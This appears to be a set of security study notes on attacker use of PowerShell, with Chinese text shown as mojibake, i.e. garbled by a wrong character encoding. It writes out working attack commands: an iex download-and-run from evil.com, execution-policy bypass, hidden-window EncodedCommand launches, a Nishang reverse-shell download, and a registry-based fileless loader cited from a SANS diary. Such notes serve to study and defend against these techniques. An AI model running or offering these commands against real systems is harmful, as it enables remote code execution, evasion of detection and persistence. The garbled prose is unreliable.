## ğŸ” PowerShell æ˜¯ä»€éº¼ï¼Ÿ

- PowerShell æ˜¯åŸºæ–¼ .NET Framework çš„å‘½ä»¤åˆ— shell èˆ‡è…³æœ¬èªè¨€ã€‚
    
- ç”¨æ–¼ç³»çµ±ç®¡ç†èˆ‡è‡ªå‹•åŒ–ï¼Œä½†ä¹Ÿå¸¸è¢«æ”»æ“Šè€…ç•¶ä½œæ»²é€åˆ©å™¨ã€‚
    
- Windows 7 SP1 èµ·é è¨­å®‰è£ï¼Œå»£æ³›å­˜åœ¨æ–¼å„ç¨® Windows ä½œæ¥­ç³»çµ±ä¸­ã€‚
    

---

## ğŸ’¡ ä»‹é¢é¡å‹

1. **CLI**ï¼š`powershell.exe`
    
2. **GUI**ï¼š`PowerShell_ISE.exe`ï¼ˆæ•´åˆå¼è…³æœ¬ç’°å¢ƒï¼‰

---
## ğŸ“œ PowerShell åŸºç¤èªæ³•å›é¡§

### â–ª Cmdlet å‘½åæ ¼å¼

- æ¨™æº–æ ¼å¼ç‚ºï¼š`å‹•è©-åè©`ï¼ˆVerb-Nounï¼‰
    
    - ä¾‹ï¼š`Get-Service`, `Start-Process`
        

### â–ª å¸¸è¦‹åƒæ•¸

- `-WhatIf`ï¼šæ¨¡æ“¬åŸ·è¡Œä½†ä¸å¯¦éš›åŸ·è¡Œ
    
- `-Force`ï¼šå¼·åˆ¶åŸ·è¡Œæ“ä½œ
    
- `-ComputerName`ï¼šé ç«¯æ“ä½œ
    
- `-Identity`ï¼šæŒ‡å®šç›®æ¨™å°è±¡
    

### â–ª æŸ¥è©¢èªªæ˜

- `Get-Help <Cmdlet>`ï¼ˆåŠ ä¸Š `-Full` æˆ– `-Examples` æŸ¥çœ‹å®Œæ•´ç”¨æ³•ï¼‰
    

---
## ğŸ› ï¸ æ”»æ“Šè€…å¸¸è¦‹ç”¨é€”

### 1. åœ¨è¨˜æ†¶é«”ä¸­åŸ·è¡Œï¼ˆMemory-onlyï¼‰

- åˆ©ç”¨ `Invoke-Expression`ï¼ˆ`iex`ï¼‰ç›´æ¥åŸ·è¡Œ payloadï¼Œä¸è½åœ°æª”æ¡ˆï¼Œ**é¿é–‹é˜²æ¯’åµæ¸¬**ã€‚

### 2. é ç«¯ä¸‹è¼‰èˆ‡åŸ·è¡Œ

- ç¯„ä¾‹ï¼š
    
```
iex (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")
```
    

### 3. å‘¼å« Windows API & .NET Code

- å¦‚åŒ¯å…¥ `System.Management.Automation.dll` ä¾†å»ºç«‹è¤‡é›œåŠŸèƒ½ã€‚

---
## ğŸš« åŸ·è¡Œæ”¿ç­–èˆ‡ç¹éæ–¹æ³•

### PowerShell åŸ·è¡Œæ”¿ç­–ï¼ˆExecution Policyï¼‰

|æ¨¡å¼|èªªæ˜|
|---|---|
|`Restricted`ï¼ˆé è¨­ï¼‰|ç¦æ­¢æ‰€æœ‰è…³æœ¬åŸ·è¡Œ|
|`AllSigned`|åƒ…å…è¨±ç°½ç« éçš„è…³æœ¬|
|`RemoteSigned`|æœ¬æ©Ÿè…³æœ¬å…è¨±ï¼Œé ç«¯è…³æœ¬éœ€ç°½ç« |
|`Unrestricted`|å…è¨±åŸ·è¡Œæ‰€æœ‰è…³æœ¬ï¼Œå½ˆå‡ºè­¦å‘Š|
|`Bypass`|ç„¡é™åˆ¶ã€ç„¡æç¤º|

### ä¿®æ”¹æ–¹å¼ï¼š

`Set-ExecutionPolicy Unrestricted`

### ä¸€æ¬¡æ€§ç¹éï¼ˆä¸éœ€æ”¹è®Šå…¨å±€è¨­å®šï¼‰ï¼š

`powershell.exe -ExecutionPolicy Bypass -File script.ps1`

---

## ğŸ­ æ··æ·†èˆ‡ååµæ¸¬æŠ€å·§

### â–ª Base64 ç·¨ç¢¼åŸ·è¡Œï¼ˆEncodedCommandï¼‰

- æ”»æ“Šè€…å°‡ payload ç·¨ç¢¼æˆ Base64 ä¸¦å‚³å…¥ `EncodedCommand`
    
- ç¯„ä¾‹ï¼š
    
    `powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand <Base64Payload>`
    

### â–ª å¸¸è¦‹åƒæ•¸çµ„åˆ

`powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...`

---
## ğŸ’¥ é€²éšæ”»æ“Šç¯„ä¾‹

### â–ª ä½¿ç”¨ `iex` å»ºç«‹ Reverse Shell

#### ğŸ“¡ HTTPï¼š

```
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
```

#### ğŸ“¡ TCPã€ICMPã€UDPã€HTTPS

Nishang æä¾›å¤šç¨® Shell æ¨¡çµ„ï¼š

- `Invoke-PowerShellTcp`
- `Invoke-PowerShellUdp`
- `Invoke-PowerShellIcmp`
- `Invoke-PoshRatHttps`

Nishang GitHubï¼š ğŸ‘‰ [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

---

## ğŸ§¬ Fileless PowerShell æ”»æ“Š

### Registry-based è¼‰å…¥æ”»æ“Š

å°‡ base64 ç·¨ç¢¼çš„æƒ¡æ„è…³æœ¬å¯«å…¥ Registryï¼Œå†ä»¥ PowerShell è§£ç¢¼åŸ·è¡Œï¼š

```
powershell.exe -windowstyle hidden -noprofile -executionpolicy bypass iex( 
	[Text.Encoding]::ASCII.GetString(
		[Convert]::FromBase64String(
			(gp 'HKCU:\Software\Classes\UBZZXDJZAOGD').XLQWFZRMYEZV
		)   
	) 
)
```

- ç¯„ä¾‹ä¾†æºï¼š[https://isc.sans.edu/diary/Powershell+Malware+No+Hard+drive+Just+hard+times/20823](https://isc.sans.edu/diary/Powershell+Malware+No+Hard+drive+Just+hard+times/20823)